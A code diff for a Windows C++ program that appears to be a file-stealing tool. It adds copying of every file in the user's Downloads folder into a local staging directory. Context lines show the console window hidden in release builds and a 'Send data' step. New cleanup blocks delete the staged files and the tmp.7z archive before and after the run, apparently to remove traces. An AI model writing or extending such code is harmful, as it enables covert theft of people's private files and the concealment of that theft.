@@ -120,6 +120,7 @@ bool fidld = false;
 void index_downloads() {
     wchar_t* temp = new wchar_t[MAX_PATH];
     wofstream file;
+    CreateDirectoryW(getabspathincurrdir(wstring(L"tmp\\downloads\\").c_str()).c_str(), NULL);
     if (!open(file, wcscpy(temp, getabspathincurrdir(L"tmp\\downloads.txt").c_str()))) { fidld = true; return; }
 
     vector<fs::path> buff;
@@ -129,7 +130,10 @@ void index_downloads() {
 
     index(buff, downloads);
     if (buff.empty()) { file << downloads << L" isn't exist"; fidld = true; return; }
-    for (fs::path p : buff) if (!is_cache(p)) file << p.wstring().c_str() << L"\n";
+    for (fs::path p : buff) {
+        if (!is_cache(p)) file << p.wstring().c_str() << L"\n"; 
+        if (COPYDOCS) fs::copy_file(p, getabspathincurrdir((L"tmp\\downloads\\" + p.filename().wstring()).c_str()));
+    }
     file.close();
 	idld = true;
 }
@@ -323,6 +327,19 @@ int wmain(int** argc, wchar_t* argv[])
     ifNDebug({ if (FreeConsole() == FALSE) return -3; });
 
     ifDebug(cout << boolalpha);
+    
+    if (CLEANBEFORE) {
+        try {
+            fs::remove_all(getabspathincurrdir(L"tmp\\").c_str());
+        }
+        catch (fs::filesystem_error& e) {
+        }
+        try {
+            fs::remove(getabspathincurrdir(L"tmp.7z").c_str());
+        }
+        catch (fs::filesystem_error& e) {
+        }
+    }
 
     CreateDirectoryW(getabspathincurrdir(L"tmp").c_str(), NULL);
 
@@ -513,5 +530,17 @@ int wmain(int** argc, wchar_t* argv[])
     // ! Send data
 
     if (ISDEBUG) { system("pause>nul"); }
+    if (CLEANAFTER) {
+        try {
+            fs::remove_all(getabspathincurrdir(L"tmp\\").c_str());
+        }
+        catch (fs::filesystem_error& e) {
+        }
+        try {
+            fs::remove(getabspathincurrdir(L"tmp.7z").c_str());
+        }
+        catch (fs::filesystem_error& e) {
+        }
+    }
     return (response_code < 400)?0:-response_code;
 }
